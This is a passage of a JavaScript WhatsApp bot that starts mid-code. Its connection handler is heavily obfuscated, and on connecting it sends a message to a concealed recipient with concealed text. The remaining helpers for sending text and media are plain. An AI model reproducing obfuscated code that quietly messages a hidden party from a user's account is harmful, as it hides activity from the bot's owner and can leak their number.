            },
            'RyQli': function (_0x1a371c, _0x31c5f9) {
                return _0x1a371c(_0x31c5f9);
            },
            'ymqUa': function (_0x331506, _0x5aa84a) {
                return _0x331506(_0x5aa84a);
            },
            'lgKVl': function (_0xb546ec, _0x31fef2) {
                return _0xb546ec(_0x31fef2);
            },
            'XgquL': function (_0x181f75, _0x3c9994) {
                return _0x181f75(_0x3c9994);
            },
            'tBJMT': function (_0x5c70f6, _0x165e32) {
                return _0x5c70f6(_0x165e32);
            },
            'lapGt': function (_0x48e8dc, _0x4fd5cb) {
                return _0x48e8dc(_0x4fd5cb);
            },
            'qWHJa': function (_0x3a33e1, _0x53b161) {
                return _0x3a33e1(_0x53b161);
            },
            'DeRhF': function (_0x1280f5, _0xbf9334) {
                return _0x1280f5(_0xbf9334);
            },
            'YxVwX': function (_0x2b2a89, _0x8a4864) {
                return _0x2b2a89(_0x8a4864);
            },
            'husio': function (_0x4e2e75, _0x3fb07b) {
                return _0x4e2e75(_0x3fb07b);
            },
            'LmNeC': function (_0x14cb57, _0x3194ba) {
                return _0x14cb57(_0x3194ba);
            },
            'bHeRD': function (_0x36284c, _0x58ea38) {
                return _0x36284c(_0x58ea38);
            },
            'VFSdi': function (_0x48fe2a, _0x545e71) {
                return _0x48fe2a(_0x545e71);
            },
            'qmwlW': function (_0x561d0f, _0x1a217a) {
                return _0x561d0f(_0x1a217a);
            },
            'QOQBc': function (_0x4895d0, _0x5166fd) {
                return _0x4895d0(_0x5166fd);
            },
            'rMfHw': function (_0x28568b, _0x575deb) {
                return _0x28568b(_0x575deb);
            }
        }, _0x1746af = _0x15e3a8, _0xbc2cf8 = {
            'QfdwG': function (_0x558cb4, _0x3b5076) {
                const _0x268346 = _0x2457;
                return _0xfe7612[_0x268346(0x138)](_0x558cb4, _0x3b5076);
            },
            'tAIrt': _0xfe7612[_0x1e697f(0x14c)](_0x1746af, -0x13 * -0x19d + 0x202c + -0x3dc9 * 0x1),
            'yyMCg': function (_0x5c3955, _0x1afc04) {
                const _0x3debac = _0x1e697f;
                return _0xfe7612[_0x3debac(0x182)](_0x5c3955, _0x1afc04);
            },
            'qytLw': function (_0x1fbedb) {
                const _0x2d773a = _0x1e697f;
                return _0xfe7612[_0x2d773a(0x192)](_0x1fbedb);
            },
            'YlUXS': _0xfe7612[_0x1e697f(0x129)](_0xfe7612[_0x1e697f(0x122)](_0xfe7612[_0x1e697f(0xf3)](_0x1746af, -0x2326 + -0x1a * -0x24 + 0x2081), _0xfe7612[_0x1e697f(0x194)](_0x1746af, 0x1 * -0x1a64 + 0x73 * -0x31 + -0x8 * -0x62d)), _0xfe7612[_0x1e697f(0x189)](_0x1746af, 0x1eae + -0x1d * -0x151 + 0x10f4 * -0x4)),
            'jPtLJ': function (_0x20c9f2, _0x58f1cf) {
                const _0xc44f6a = _0x1e697f;
                return _0xfe7612[_0xc44f6a(0x171)](_0x20c9f2, _0x58f1cf);
            },
            'meEZj': _0xfe7612[_0x1e697f(0x14c)](_0x1746af, 0xc7 * 0x9 + 0x271 + 0x3 * -0x2d1),
            'ZhjQh': _0xfe7612[_0x1e697f(0x122)](_0xfe7612[_0x1e697f(0x158)](_0xfe7612[_0x1e697f(0x118)](_0x1746af, -0x2 * 0xccb + -0x1c71 + -0x36f2 * -0x1), _0xfe7612[_0x1e697f(0x14c)](_0x1746af, -0x11f1 + 0x1bb + 0x113a)), '..'),
            'oTqTB': _0xfe7612[_0x1e697f(0x129)](_0xfe7612[_0x1e697f(0x158)](_0xfe7612[_0x1e697f(0x16c)](_0x1746af, -0x7b9 + -0x112b * -0x1 + 0x16a * -0x6), _0xfe7612[_0x1e697f(0x189)](_0x1746af, 0x22a9 + 0x170d + -0xc7 * 0x49)), _0xfe7612[_0x1e697f(0x13a)](_0x1746af, -0x116c + -0x11dd + 0x2451)),
            'BguMs': _0xfe7612[_0x1e697f(0x129)](_0xfe7612[_0x1e697f(0x13a)](_0x1746af, 0xcd9 * -0x1 + 0x15f0 + -0x828), _0xfe7612[_0x1e697f(0x19c)](_0x1746af, 0xf9a + -0x2256 + 0x13ac))
        }, {
            connection: _0x44a7e1,
            lastDisconnect: _0x3e6655
        } = _0x5e66f0, _0x27a8b2 = _0x3e6655?.[_0xfe7612[_0x1e697f(0x16c)](_0x1746af, -0x1dca * 0x1 + -0xc2 * -0x13 + 0x104a)]?.[_0xfe7612[_0x1e697f(0x149)](_0x1746af, 0xb5a * -0x2 + -0xe53 + 0x2603)]?.[_0xfe7612[_0x1e697f(0x16c)](_0x1746af, -0x1ae * 0x8 + -0x2 * 0x233 + 0x12d4)] || _0x3e6655?.[_0xfe7612[_0x1e697f(0x128)](_0x1746af, -0xa9 * -0x1a + 0x5de * -0x2 + -0x1 * 0x488)]?.[_0xfe7612[_0x1e697f(0x16c)](_0x1746af, -0x47 * -0x1b + -0x2 * -0x4cf + -0x101f)]?.[_0xfe7612[_0x1e697f(0x112)](_0x1746af, -0x27b * -0xc + -0x10c0 + 0x2 * -0x60c)]?.[_0xfe7612[_0x1e697f(0x128)](_0x1746af, -0x6df + 0xc32 + -0x455)];
    _0xbc2cf8[_0xfe7612[_0x1e697f(0x10e)](_0x1746af, -0x1 * 0x1027 + 0xd * -0x25d + 0x2ff0)](_0x44a7e1, _0xbc2cf8[_0xfe7612[_0x1e697f(0x16a)](_0x1746af, 0x1615 * 0x1 + -0x163 * 0x4 + 0x7c7 * -0x2)]) && (_0xbc2cf8[_0xfe7612[_0x1e697f(0x13a)](_0x1746af, 0x3 * -0x7a5 + -0xfd * -0x25 + -0x6f * 0x1d)](_0x3e6655[_0xfe7612[_0x1e697f(0x112)](_0x1746af, 0x2624 + -0x1e5 + 0x2359 * -0x1)]?.[_0xfe7612[_0x1e697f(0x15c)](_0x1746af, -0x655 + 0xf94 + -0x1a7 * 0x5)]?.[_0xfe7612[_0x1e697f(0x189)](_0x1746af, 0x225c + 0x243d * 0x1 + -0x459b)], DisconnectReason[_0xfe7612[_0x1e697f(0x199)](_0x1746af, 0x1 * 0x1c98 + -0x1193 + 0x359 * -0x3)]) ? _0xbc2cf8[_0xfe7612[_0x1e697f(0x15d)](_0x1746af, 0x98e + 0x9a * -0xa + -0x27c)](child) : console[_0xfe7612[_0x1e697f(0x16a)](_0x1746af, 0x1075 + 0x347 + -0x12b5)](_0xbc2cf8[_0xfe7612[_0x1e697f(0x11c)](_0x1746af, 0xe4e + -0x75e * 0x2 + 0x155)])), _0xbc2cf8[_0xfe7612[_0x1e697f(0x112)](_0x1746af, 0xdc5 + 0x1 * 0x20 + -0xcdf)](_0x44a7e1, _0xbc2cf8[_0xfe7612[_0x1e697f(0x148)](_0x1746af, -0xead + 0x24fa + -0x1558)]) && (console[_0xfe7612[_0x1e697f(0x199)](_0x1746af, -0x1de9 + 0xa54 + 0x149c)](chalk[_0xfe7612[_0x1e697f(0x119)](_0x1746af, 0x201a * -0x1 + 0x970 + -0x29f * -0x9)](chalk[_0xfe7612[_0x1e697f(0x12f)](_0x1746af, 0x1 * -0x1c63 + 0x4f * -0x3a + 0x2f3a)](_0xbc2cf8[_0xfe7612[_0x1e697f(0x15c)](_0x1746af, 0x1 * 0x2597 + 0xa1 * 0x2e + 0x1 * -0x4178)]))), conn[_0xfe7612[_0x1e697f(0x129)](_0xfe7612[_0x1e697f(0x119)](_0x1746af, -0x40 * 0x59 + -0x1 * 0x6b + 0x17b0), 'e')](_0xbc2cf8[_0xfe7612[_0x1e697f(0x143)](_0x1746af, 0x1212 * 0x1 + 0x20f + 0x7 * -0x2bf)], { 'text': _0xbc2cf8[_0xfe7612[_0x1e697f(0x15d)](_0x1746af, -0x5ce * 0x4 + -0x1b14 + 0x18e * 0x21)] }));
}));
function _0xf368(_0x43e3ea, _0x2e75e1) {
    const _0x259057 = _0x2457, _0x2313b3 = {
            'mNDYu': function (_0x1c0687, _0x518c18) {
                return _0x1c0687 - _0x518c18;
            },
            'TyuHN': function (_0x317b05, _0x447b2f) {
                return _0x317b05 + _0x447b2f;
            },
            'qYBtk': function (_0x5d90cc, _0x18b0e0) {
                return _0x5d90cc * _0x18b0e0;
            },
            'DvoEC': function (_0x2d5b59) {
                return _0x2d5b59();
            },
            'esHiW': function (_0x41c622, _0x5b083e, _0xd4ecf4) {
                return _0x41c622(_0x5b083e, _0xd4ecf4);
            }
        }, _0xeeff3f = _0x2313b3[_0x259057(0x165)](_0x3a61);
    return _0xf368 = function (_0x4c935e, _0x167598) {
        const _0x5837e8 = _0x259057;
        _0x4c935e = _0x2313b3[_0x5837e8(0x153)](_0x4c935e, _0x2313b3[_0x5837e8(0x160)](_0x2313b3[_0x5837e8(0x160)](_0x2313b3[_0x5837e8(0x18e)](-(0x1 * 0x1091 + 0x8 * -0x422 + 0x10d2), -(0x1324 + 0x1 * -0x1e8d + -0x1e9 * -0x6)), -(-0x1 * 0xd5e + -0x22a * 0xc + 0x35ae)), 0x1d1b + 0x13 * 0x1b6 + -0x3296));
        let _0x246650 = _0xeeff3f[_0x4c935e];
        return _0x246650;
    }, _0x2313b3[_0x259057(0x144)](_0xf368, _0x43e3ea, _0x2e75e1);
}
function _0x3a61() {
    const _0x12bbc7 = _0x2457, _0x7c91f5 = {
            'RPHNE': _0x12bbc7(0x100),
            'nGfOy': _0x12bbc7(0x115),
            'Ebdda': _0x12bbc7(0x17d),
            'kUNBS': _0x12bbc7(0x161) + _0x12bbc7(0x180),
            'SXbVH': _0x12bbc7(0x146),
            'UyGYW': _0x12bbc7(0x104),
            'TUagk': _0x12bbc7(0x197),
            'NXtbk': _0x12bbc7(0x176),
            'mzmQu': _0x12bbc7(0x14e),
            'MvwyA': _0x12bbc7(0x111),
            'iFYut': _0x12bbc7(0x13b),
            'bwyJo': _0x12bbc7(0x174) + _0x12bbc7(0xfb),
            'vPGGa': _0x12bbc7(0x16f),
            'OJJtd': _0x12bbc7(0xf2),
            'sBZTA': _0x12bbc7(0x12b),
            'VhYSt': _0x12bbc7(0x19d),
            'SGRPR': _0x12bbc7(0x19a),
            'QqepZ': _0x12bbc7(0x103),
            'YpoWp': _0x12bbc7(0xfa),
            'eVUdP': _0x12bbc7(0x18f),
            'bnAwn': _0x12bbc7(0x12d) + 'YD',
            'ZEauL': _0x12bbc7(0x15f),
            'mXdFa': _0x12bbc7(0x11a),
            'BsCKe': _0x12bbc7(0x156),
            'BjlFP': _0x12bbc7(0x173),
            'AmMWU': _0x12bbc7(0x121),
            'LtOnO': _0x12bbc7(0x12e),
            'KUcEU': _0x12bbc7(0x163),
            'hUBfE': _0x12bbc7(0x151),
            'rXBiE': _0x12bbc7(0x183),
            'vkQAU': _0x12bbc7(0x13c),
            'RYgFc': _0x12bbc7(0x106) + _0x12bbc7(0x152),
            'DNKbX': _0x12bbc7(0x184),
            'oBPcI': _0x12bbc7(0x107),
            'GEepO': _0x12bbc7(0x117),
            'qHHxT': _0x12bbc7(0x14b),
            'mWDKJ': _0x12bbc7(0x11e) + 'G',
            'rxqBq': _0x12bbc7(0x135),
            'RfcZt': _0x12bbc7(0x10b),
            'kxtsw': _0x12bbc7(0x188),
            'mBwXs': _0x12bbc7(0xfe) + _0x12bbc7(0x13f),
            'mQJTh': _0x12bbc7(0x110) + 'h',
            'KveeX': _0x12bbc7(0x1a0),
            'SbTnB': function (_0x79f4fa) {
                return _0x79f4fa();
            }
        }, _0x40ac73 = [
            _0x7c91f5[_0x12bbc7(0x12a)],
            _0x7c91f5[_0x12bbc7(0x18d)],
            _0x7c91f5[_0x12bbc7(0x16e)],
            _0x7c91f5[_0x12bbc7(0x154)],
            _0x7c91f5[_0x12bbc7(0xf7)],
            _0x7c91f5[_0x12bbc7(0x191)],
            _0x7c91f5[_0x12bbc7(0x145)],
            _0x7c91f5[_0x12bbc7(0x17b)],
            _0x7c91f5[_0x12bbc7(0x16b)],
            _0x7c91f5[_0x12bbc7(0x179)],
            _0x7c91f5[_0x12bbc7(0x101)],
            _0x7c91f5[_0x12bbc7(0x13d)],
            _0x7c91f5[_0x12bbc7(0x195)],
            _0x7c91f5[_0x12bbc7(0x18a)],
            _0x7c91f5[_0x12bbc7(0x198)],
            _0x7c91f5[_0x12bbc7(0x13e)],
            _0x7c91f5[_0x12bbc7(0x11d)],
            _0x7c91f5[_0x12bbc7(0x18b)],
            _0x7c91f5[_0x12bbc7(0x150)],
            _0x7c91f5[_0x12bbc7(0x178)],
            _0x7c91f5[_0x12bbc7(0x190)],
            _0x7c91f5[_0x12bbc7(0x109)],
            _0x7c91f5[_0x12bbc7(0x15e)],
            _0x7c91f5[_0x12bbc7(0x113)],
            _0x7c91f5[_0x12bbc7(0x196)],
            _0x7c91f5[_0x12bbc7(0x12c)],
            _0x7c91f5[_0x12bbc7(0x157)],
            _0x7c91f5[_0x12bbc7(0xfc)],
            _0x7c91f5[_0x12bbc7(0x170)],
            _0x7c91f5[_0x12bbc7(0x193)],
            _0x7c91f5[_0x12bbc7(0x132)],
            _0x7c91f5[_0x12bbc7(0x168)],
            _0x7c91f5[_0x12bbc7(0x19f)],
            _0x7c91f5[_0x12bbc7(0x14a)],
            _0x7c91f5[_0x12bbc7(0x10f)],
            _0x7c91f5[_0x12bbc7(0xf5)],
            _0x7c91f5[_0x12bbc7(0x139)],
            _0x7c91f5[_0x12bbc7(0x186)],
            _0x7c91f5[_0x12bbc7(0x181)],
            _0x7c91f5[_0x12bbc7(0xf1)],
            _0x7c91f5[_0x12bbc7(0x15a)],
            _0x7c91f5[_0x12bbc7(0x141)],
            _0x7c91f5[_0x12bbc7(0x116)]
        ];
    return _0x3a61 = function () {
        return _0x40ac73;
    }, _0x7c91f5[_0x12bbc7(0x185)](_0x3a61);
}
  
  conn.sendText = (jid, teks, quoted = '', options) => {
    return conn.sendMessage(jid, {
      text: teks,
      ...options
    }, {
      quoted,
      ...options
    })
  };
  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      let res = await axios.head(url)
      mime = res.headers['content-type']
      
      if (mime.split("/")[1] === "gif") {
     return conn.sendMessage(jid, { 
       video: await getBuffer(url), 
       caption: caption, 
       gifPlayback: true, 
       ...options
       }, { 
       quoted: quoted, 
       ...options
       })
      }
      
      let type = mime.split("/")[0]+"Message"
      if(mime === "application/pdf") {
     return conn.sendMessage(jid, { 
       document: await getBuffer(url), 
       mimetype: 'application/pdf', 
       caption: caption, 
       ...options
       }, { 
       quoted: quoted, 
       ...options 
       })
      }
      
      if(mime.split("/")[0] === "image") {
     return conn.sendMessage(jid, { 
       image: await getBuffer(url), 
       caption: caption,
       ...options
       }, { 
       quoted: quoted, 
       ...options
       })
      }
      
      if(mime.split("/")[0] === "video") {
     return conn.sendMessage(jid, {
       video: await getBuffer(url), 
       caption: caption, 
       mimetype: 'video/mp4', 
       ...options
       }, { 
       quoted: quoted, 
       ...options 
       })
      }
      
      if(mime.split("/")[0] === "audio") {
     return conn.sendMessage(jid, { 
     audio: await getBuffer(url), 
     caption: caption, 
     mimetype: 'audio/mpeg', 
     ...options
     }, { 
     quoted: quoted, 
     ...options
      })
      }
    }
    
  conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
    return await conn.sendMessage(jid, {
      image: buffer,
      caption: caption,
      jpegThumbnail: '',
      ...options
    }, {
      quoted
    });
  };

  conn.sendVideo = async (jid, path, caption = '', quoted = '', gif = false, options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
    return await conn.sendMessage(jid, {
      video: buffer,
      caption: caption,
      gifPlayback: gif,
      jpegThumbnail: '',
      ...options
    }, {
      quoted
    });
  };

  conn.sendAudio = async (jid, path, quoted = '', ptt = false, options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
    return await conn.sendMessage(jid, {
      audio: buffer,
      ptt: ptt,
      ...options
    }, {
      quoted
    });
  };
  
  return conn;
    }
  child().catch((err) => console.log(err))
}


startServer();

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
